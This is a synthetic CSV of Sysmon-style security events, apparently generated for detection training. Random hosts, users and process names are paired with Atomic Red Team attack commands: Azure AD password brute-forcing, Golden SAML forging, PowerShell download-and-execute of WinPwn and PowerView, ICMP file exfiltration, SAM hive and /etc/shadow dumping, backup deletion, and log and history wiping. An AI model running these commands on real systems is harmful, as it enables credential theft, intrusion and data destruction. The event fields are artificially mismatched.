EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
11,File Create,lt-86.miller.biz,wilsonantonio,8441,taskmgr.exe,"""Import-Module -Name AzureAD\n\n$passwords = \""#{passwords}\"".split(\""{`n}\"")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \""$password\"" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""#{username}\"", $Pword\n  try {\n    Write-Host \"" [-] Attempting ${password} on account #{username}.\""\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \"" [!] #{username}:${password} are valid credentials!`r`n\""\n    break\n  } catch {\n    Write-Host \"" [-] #{username}:${password} invalid credentials.`r`n\""\n  }\n}\nWrite-Host \""End of bruteforce\""\n"",",822852,9e4446d4-8a5e-4117-a880-27fc97158a20,8098,regsvr32.exe,C:\Users\Public\service..exe,4999,explorer.exe,C:\Users\Public\day..exe,2024-05-17T01:36:51.717792Z
5,Process Terminate,laptop-94.blanchard-ramirez.net,gonzalezbill,7091,malware.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive"",",294910,60a858b6-c469-4f3a-a33e-d10a1dda393b,3376,cmd.exe,C:\Program Files\never..exe,7954,regsvr32.exe,C:\Windows\these..exe,2024-05-17T01:36:51.717792Z
11,File Create,laptop-39.gomez.org,qpatrick,6240,rundll32.exe,"""Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \""#{immutable_id}\"" -PfxFileName \""#{certificate_path}\"" -Issuer \""#{issuer_uri}\""\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \""`nSuccessfully connected as $($conn.User)\"" } else { Write-Host \""`nThe connection failed\"" }\nWrite-Host \""End of Golden SAML\""\n"",",368037,710b1861-993c-4f9e-a815-d3ac34d2b6de,8409,taskmgr.exe,C:\Users\Public\deal..exe,8134,cmd.exe,C:\Windows\they..exe,2024-05-17T01:36:51.717792Z
11,File Create,laptop-46.fleming-smith.info,william60,8766,mimikatz.exe,"""shutdown -r #{timeout}\n"",",247135,d0173bc9-cb3c-4c41-9400-05705b711845,9363,backdoor.exe,C:\Windows\sure..exe,6817,regsvr32.exe,C:\Users\Public\chair..exe,2024-05-17T01:36:51.718797Z
5,Process Terminate,web-53.martin.org,erika25,1260,taskmgr.exe,"""chown -R #{owner}:#{group} #{file_or_folder}\n"",",107581,9567a391-1a42-4363-849b-6daeec932a62,1787,malware.exe,C:\Windows\often..exe,8560,mimikatz.exe,C:\Program Files\manage..exe,2024-05-17T01:36:51.718797Z
3,Network Connection,web-23.ingram-pitts.com,jason29,8434,powershell.exe,"""sysmon -u\n"",",760908,a0afa5f0-15ce-4537-9e6c-08f8ec21ddb5,6332,taskmgr.exe,C:\Program Files\Congress..dll,4668,nc.exe,C:\Users\Public\administration..dll,2024-05-17T01:36:51.718797Z
3,Network Connection,lt-86.miller.biz,frances98,4189,regsvr32.exe,"""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \""#{input_source_code}\""\n#{output_file_name}\n"",",949062,2cb4ad59-c659-49d6-8507-1c7a6f07eead,2144,rundll32.exe,C:\Windows\leader..dll,6401,nc.exe,C:\Program Files\list..dll,2024-05-17T01:36:51.718797Z
1,Process Create,db-99.bowers-ortiz.org,cheyenne78,8153,mimikatz.exe,"""New-ItemProperty -Path \""HKLM:\\Software\\Microsoft\\Command Processor\"" -Name \""AutoRun\"" -Value \""#{command}\"" -PropertyType \""String\"""",",117992,d11fb45d-7c15-4a83-9d50-19cc7c0b2d5f,6624,regsvr32.exe,C:\Program Files\strong..exe,6503,nc.exe,C:\Program Files\billion..dll,2024-05-17T01:36:51.718797Z
3,Network Connection,web-50.osborne.org,fitzgeraldjoseph,6039,powershell.exe,"""ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n"",",367489,4e7ee0f0-6242-416f-bab9-c060ae184f48,7091,rundll32.exe,C:\Program Files\church..exe,4375,malware.exe,C:\Windows\attorney..dll,2024-05-17T01:36:51.718797Z
11,File Create,laptop-85.tyler.com,ginawhite,7465,regsvr32.exe,"""reg.exe import \""#{registry_file}\""\n"",",219822,cb32cd1c-aa9b-4b64-afd8-66ebfba07f31,7859,taskmgr.exe,C:\Users\Public\religious..dll,7415,rundll32.exe,C:\Users\Public\walk..dll,2024-05-17T01:36:51.719800Z
1,Process Create,srv-80.rose-snyder.com,brian50,4916,powershell.exe,"""$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \""User\"" -and $_.PrincipalSource -match \""Local\""} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \""*Administrator*\"") {\n        $account = $member.Name.Split(\""\\\"")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \""atr:$account;$originalDescription\"".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \""HaHa_$x$y$z\"" # Required due to length limitation\n        Write-Host \""Successfully Renamed $account Account on \"" $Env:COMPUTERNAME\n        }\n    }\n"",",603960,506e5bea-b700-4b7d-9a2e-a462d6208b30,8679,cmd.exe,C:\Windows\win..exe,8274,malware.exe,C:\Program Files\develop..dll,2024-05-17T01:36:51.719800Z
5,Process Terminate,lt-22.murphy.com,pmora,4307,taskmgr.exe,"""set -x\nsudo kextload #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload #{module_path}\nsudo kmutil load -p #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kmutil unload -p #{module_path}\n"",",997782,6c08693a-1b38-4f72-84d8-2b946841f51b,5655,rundll32.exe,C:\Users\Public\memory..exe,7762,cmd.exe,C:\Program Files\safe..dll,2024-05-17T01:36:51.719800Z
11,File Create,web-48.owens.com,hannah87,8125,nc.exe,"""chmod #{symbolic_mode} #{file_or_folder}\n"",",299560,fa0c02d0-72c6-42ce-b792-602a65930f71,9291,malware.exe,C:\Users\Public\their..exe,7977,rundll32.exe,C:\Users\Public\first..exe,2024-05-17T01:36:51.719800Z
7,Image Load,db-19.mack.net,millerlarry,1982,backdoor.exe,"""halt -p\n"",",278459,5530271b-79b1-477b-aa2a-6142405d32a2,6106,malware.exe,C:\Program Files\within..dll,3168,nc.exe,C:\Program Files\five..dll,2024-05-17T01:36:51.720797Z
11,File Create,desktop-27.murray-frederick.com,alexmorrison,9896,powershell.exe,"""cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n"",",813243,5f28ec14-335d-43f5-96f7-680d16a230d6,7995,cmd.exe,C:\Windows\compare..exe,9638,backdoor.exe,C:\Program Files\whom..exe,2024-05-17T01:36:51.720797Z
11,File Create,email-77.williams.com,newmanhenry,9333,backdoor.exe,"""\""PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"" -f (objectcategory=group) #{optional_args}\n"",",814718,933d2fc3-5338-40a5-8ea5-f841296c931e,2378,regsvr32.exe,C:\Users\Public\individual..exe,3144,mimikatz.exe,C:\Program Files\somebody..exe,2024-05-17T01:36:51.720797Z
11,File Create,lt-63.lee-ball.biz,dustinwalker,6751,powershell.exe,"""$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\""#{ip_address}\"", 1500, $Data) }\n"",",788174,91805290-c6ca-4f10-b5d4-8d8c09d97315,6996,regsvr32.exe,C:\Windows\season..exe,9957,explorer.exe,C:\Users\Public\one..exe,2024-05-17T01:36:51.720797Z
1,Process Create,db-20.fisher.net,jennifer81,1533,cmd.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n"",",919094,3ac6f6b9-28f2-47ad-9e89-87e0ef2a56f9,3446,taskmgr.exe,C:\Users\Public\particularly..dll,6180,powershell.exe,C:\Windows\prepare..exe,2024-05-17T01:36:51.720797Z
7,Image Load,email-85.fuentes-williams.com,katherine49,4595,backdoor.exe,"""net user $ ATOMIC123! /add /active:yes"",",218941,816545b8-341c-4a16-95b9-05d79889d570,3210,powershell.exe,C:\Program Files\involve..exe,5895,backdoor.exe,C:\Windows\heart..exe,2024-05-17T01:36:51.720797Z
11,File Create,db-45.zamora-kramer.com,thomasmorrison,6061,regsvr32.exe,"""$ipAddr = \""#{ip_address}\""\nif ($ipAddr -eq \""\"") {\n    # Assumes the \""primary\"" interface is shown at the top\n    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n    Write-Host \""[i] Using Interface $interface\""\n    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n}\nWrite-Host \""[i] Base IP-Address for Subnet: $ipAddr\""\n$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n# Always assumes /24 subnet\nWrite-Host \""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\""\n\n$ports = #{port_list}\n$subnetIPs = 1..254 | ForEach-Object { \""$subnetSubstring$_\"" }\n\nforeach ($ip in $subnetIPs) {\n    foreach ($port in $ports) {\n      try {\n          $tcp = New-Object Net.Sockets.TcpClient\n          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n      } catch {}\n      if ($tcp.Connected) {\n          $tcp.Close()\n          Write-Host \""Port $port is open on $ip\""\n      }\n    }\n}\n"",",919329,88d688b4-8cff-4f0b-86b4-b8a77e348d7a,6603,mimikatz.exe,C:\Users\Public\official..dll,9117,malware.exe,C:\Program Files\piece..exe,2024-05-17T01:36:51.721798Z
7,Image Load,web-24.davis-ashley.com,bowmanrobert,6615,backdoor.exe,"""ldifde.exe -f #{output_path}\\#{output_file} -p subtree\n"",",511907,6f51232a-8840-46af-93d5-16a0f87beaf8,4756,taskmgr.exe,C:\Windows\pass..dll,2483,nc.exe,C:\Windows\care..dll,2024-05-17T01:36:51.721798Z
1,Process Create,laptop-15.williams-paul.com,anthonystephanie,5036,mimikatz.exe,"""$wdApp = New-Object -COMObject \""Word.Application\""\nif(-not $wdApp.path.contains(\""Program Files (x86)\""))  \n{\n  Write-Host \""64-bit Office\""\n  reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\"" /t REG_SZ /d \""PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\"" /f       \n}\nelse{\n  Write-Host \""32-bit Office\""\n  reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\"" /t REG_SZ /d \""PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\"" /f\n}\nStop-Process -Name \""WinWord\"" \nStart-Process \""WinWord\""\n"",",413587,54db43be-2365-42cb-a2b1-83963530038c,3595,explorer.exe,C:\Users\Public\several..exe,5679,cmd.exe,C:\Program Files\woman..exe,2024-05-17T01:36:51.721798Z
7,Image Load,laptop-91.lee.info,tmeyers,9240,explorer.exe,"""echo #{bash_encoded} | base64 -d | bash\necho #{dash_encoded} | base64 -d | bash\necho #{fish_encoded} | base64 -d | bash\necho #{sh_encoded} | base64 -d | bash\n"",",522533,ca4f37a4-fdb5-4d6f-b58f-7f82483405b5,8302,mimikatz.exe,C:\Program Files\benefit..dll,6201,powershell.exe,C:\Users\Public\medical..dll,2024-05-17T01:36:51.721798Z
11,File Create,web-84.williams.com,aprilrhodes,5032,backdoor.exe,"""echo '#{text_to_append}' >> ~/.profile\n"",",689550,6f898073-d8e9-47c3-a6e9-3fb0a40218fe,9763,mimikatz.exe,C:\Windows\behavior..exe,7518,taskmgr.exe,C:\Users\Public\law..exe,2024-05-17T01:36:51.722798Z
5,Process Terminate,desktop-45.stevens-smith.info,fprice,6095,regsvr32.exe,"""sudo cp #{script_location} #{script_destination}\nsudo touch /private/var/db/emondClients/#{empty_file}\n"",",966606,151edb14-4868-46cb-b899-362f09dc8c03,7625,mimikatz.exe,C:\Users\Public\realize..dll,9693,mimikatz.exe,C:\Windows\worker..exe,2024-05-17T01:36:51.722798Z
1,Process Create,lt-40.johnson.com,jocelyn72,5602,backdoor.exe,"""function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \""LDAP://\"" + ([ADSI]\""\"").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \""Password found for User:$User Password:$Password\""\n  }\n  else { Write-Host \"". \"" -NoNewline}\n}\nWrite-Host -ForegroundColor green \""Finished\""\n}\nInvoke-dpsLight \""#{password}\"" $env:Temp\\usersdpsLight.txt\n"",",451864,f1b4a8d4-d32a-480f-bffd-07a9d6fdee85,3061,explorer.exe,C:\Windows\boy..dll,6062,malware.exe,C:\Windows\art..exe,2024-05-17T01:36:51.722798Z
5,Process Terminate,db-41.scott.com,randy52,4246,mimikatz.exe,"""vaultcmd /listcreds:\""Windows Credentials\""\n"",",579592,abd36cd9-0306-4386-9995-ac8813aff3d0,5342,rundll32.exe,C:\Program Files\expert..exe,2671,powershell.exe,C:\Windows\us..dll,2024-05-17T01:36:51.722798Z
11,File Create,email-44.nelson.com,moralesryan,2118,powershell.exe,"""# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \""#{test_harness}\""\n\n$InstallerAssemblyDir = \""#{assembly_dir}\""\n$InstallerAssemblyFileName = \""#{assembly_filename}\""\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \""/logfile= /logtoconsole=false `\""$InstallerAssemblyFullPath`\""\""\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\""\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\""@\n}\n"",",383483,69b6786d-0884-4d52-a6f5-a6aaaa35c349,1658,backdoor.exe,C:\Windows\defense..exe,1271,rundll32.exe,C:\Windows\reason..dll,2024-05-17T01:36:51.723797Z
7,Image Load,laptop-16.jones-meyer.org,russell73,4107,rundll32.exe,"""del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n"",",884318,770e895a-92e2-47be-9fdf-a5340e43d226,7094,regsvr32.exe,C:\Windows\miss..dll,6149,nc.exe,C:\Users\Public\baby..exe,2024-05-17T01:36:51.723797Z
3,Network Connection,web-33.vaughan.biz,sanchezleonard,8343,cmd.exe,"""Remove-Item -Path (Join-Path \""$Env:SystemRoot\\prefetch\\\"" (Get-ChildItem -Path \""$Env:SystemRoot\\prefetch\\*.pf\"" -Name)[0])\n"",",532677,ef78da0e-10df-46d3-a1d9-3b58bd155dbb,3117,malware.exe,C:\Users\Public\write..exe,9880,explorer.exe,C:\Users\Public\show..exe,2024-05-17T01:36:51.723797Z
5,Process Terminate,srv-84.smith-ortega.com,lmartin,4857,powershell.exe,"""Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force"",",962936,44a747b3-bd3f-4620-a5a9-15df0596e012,4743,mimikatz.exe,C:\Program Files\year..exe,3363,backdoor.exe,C:\Users\Public\part..dll,2024-05-17T01:36:51.723797Z
11,File Create,lt-85.colon.info,christopher50,1429,regsvr32.exe,"""TEST=$(echo $HISTCONTROL)\nif [ \""$HISTCONTROL\"" != \""ignoreboth\"" ]; then export HISTCONTROL=\""ignoreboth\""; fi\nhistory -c \nls -la $HISTFILE # \"" ls -la $HISTFILE\""\nif [ $(history |wc -l) -eq 1 ]; then echo \""ls -la is not in history cache\""; fi\n# -> ls -la is not in history cache\nif [ \""$HISTCONTROL\"" != \""erasedups\"" ]; then export HISTCONTROL=\""erasedups\""; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \""Their is only one entry for ls -la $HISTFILE\""; fi\n"",",760052,59258ff7-ee63-4c0f-b4a3-6ac3d0adb5db,6266,cmd.exe,C:\Program Files\hot..exe,9750,taskmgr.exe,C:\Users\Public\identify..exe,2024-05-17T01:36:51.724797Z
7,Image Load,laptop-37.barnes.info,robertmoore,7385,backdoor.exe,"""cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n"",",609062,c6d64d40-1b71-43a9-9536-7d0b7f15c8f1,5975,nc.exe,C:\Program Files\much..dll,9393,malware.exe,C:\Users\Public\health..exe,2024-05-17T01:36:51.724797Z
5,Process Terminate,email-46.mills-nguyen.org,qgregory,4278,malware.exe,"""& \""PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\""\n"",",585134,f5c1ee45-9c71-47d8-afe5-775633405e92,1184,backdoor.exe,C:\Program Files\run..dll,5999,powershell.exe,C:\Program Files\theory..dll,2024-05-17T01:36:51.724797Z
7,Image Load,desktop-37.smith.info,christopher63,4389,regsvr32.exe,"""sudo cat /etc/master.passwd > #{output_file}\ncat #{output_file}\n"",",539084,e2782eea-9069-4eb4-ae73-ab91b84af326,8529,explorer.exe,C:\Windows\learn..exe,3017,regsvr32.exe,C:\Users\Public\television..dll,2024-05-17T01:36:51.724797Z
1,Process Create,lt-99.wheeler.com,odonnellmichael,4262,rundll32.exe,"""reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n"",",904988,38826978-c43f-4e38-98c7-798ee22e8b59,4335,explorer.exe,C:\Users\Public\east..dll,3310,powershell.exe,C:\Users\Public\she..dll,2024-05-17T01:36:51.724797Z
5,Process Terminate,web-18.reed.org,todd33,4701,cmd.exe,"""Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}"",",876708,e3d14e32-e377-4c07-bc45-1637cd48f8c1,2162,explorer.exe,C:\Users\Public\its..exe,3657,explorer.exe,C:\Program Files\from..dll,2024-05-17T01:36:51.725803Z
11,File Create,lt-95.robinson.info,cjohnson,3074,cmd.exe,"""\""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\""\n"",",539602,752980ac-f7c4-4336-bd49-982d1ff8d384,5348,explorer.exe,C:\Users\Public\idea..exe,9050,nc.exe,C:\Users\Public\every..dll,2024-05-17T01:36:51.725803Z
7,Image Load,email-27.duarte-nelson.info,hardyjohn,7121,taskmgr.exe,"""testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\n[ \""$(uname)\"" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n"",",432685,b938bd94-e175-4264-a9a4-7c673fe47d0a,6603,powershell.exe,C:\Users\Public\believe..exe,7441,regsvr32.exe,C:\Users\Public\without..exe,2024-05-17T01:36:51.725803Z
1,Process Create,db-70.becker.biz,baileysydney,7230,rundll32.exe,"""findstr /S cpassword %logonserver%\\sysvol\\*.xml\n"",",504894,5aa35316-3995-4384-b3ed-08eba32e10a5,4793,rundll32.exe,C:\Windows\despite..exe,2023,malware.exe,C:\Users\Public\dream..exe,2024-05-17T01:36:51.725803Z
11,File Create,lt-50.sheppard-lewis.com,brittanycruz,7921,regsvr32.exe,"""$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n"",",959104,9a0afa73-c761-4eed-aee4-95f3c97dd4ab,2420,regsvr32.exe,C:\Users\Public\hear..exe,8429,regsvr32.exe,C:\Users\Public\argue..exe,2024-05-17T01:36:51.725803Z
7,Image Load,desktop-05.boyd.com,bakeranthony,1572,nc.exe,"""fsutil usn deletejournal /D C:\n"",",557101,b97154b2-8f8a-46bc-a42f-171ad5c64d77,4976,backdoor.exe,C:\Windows\both..dll,3466,backdoor.exe,C:\Windows\million..dll,2024-05-17T01:36:51.726797Z
1,Process Create,db-40.jones.com,rogerthompson,6384,mimikatz.exe,"""pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n"",",873802,f75c96fa-52a4-4032-9c8b-01b836e67fd5,1390,taskmgr.exe,C:\Windows\attack..dll,8073,taskmgr.exe,C:\Users\Public\him..dll,2024-05-17T01:36:51.726797Z
5,Process Terminate,db-58.davis.info,lauren05,4154,backdoor.exe,"""$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n"",",536648,913eec93-6072-400b-825c-bd32a4d6c41a,4568,mimikatz.exe,C:\Windows\between..dll,5735,malware.exe,C:\Users\Public\themselves..dll,2024-05-17T01:36:51.726797Z
7,Image Load,web-09.hernandez.org,aaronmyers,5662,mimikatz.exe,"""Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n"",",586575,cd2c4a11-127f-4ecb-82da-21146664c032,5394,mimikatz.exe,C:\Users\Public\into..exe,3391,backdoor.exe,C:\Windows\network..dll,2024-05-17T01:36:51.726797Z
3,Network Connection,web-48.horton.net,ortizapril,6920,taskmgr.exe,"""secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n"",",164030,d7838522-2f1f-4944-84e9-f61b8b55e868,4181,regsvr32.exe,C:\Users\Public\mind..exe,5334,regsvr32.exe,C:\Windows\special..exe,2024-05-17T01:36:51.726797Z
1,Process Create,desktop-24.evans.biz,fburns,2679,rundll32.exe,"""cmd.exe /c \""#{local_folder}\\#{local_executable}\"" asreproast /outfile:\""#{local_folder}\\#{out_file}\""\n"",",571571,fbb0b402-260c-4db0-ad27-546b67c527ba,1215,explorer.exe,C:\Users\Public\worker..exe,1405,mimikatz.exe,C:\Windows\economic..exe,2024-05-17T01:36:51.726797Z
1,Process Create,email-10.sanchez-harper.com,steven40,5008,mimikatz.exe,"""python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}"",",118787,81e7f6c4-1a3e-49c7-84e5-ed7a20022f18,7624,rundll32.exe,C:\Windows\station..exe,5041,cmd.exe,C:\Program Files\listen..dll,2024-05-17T01:36:51.726797Z
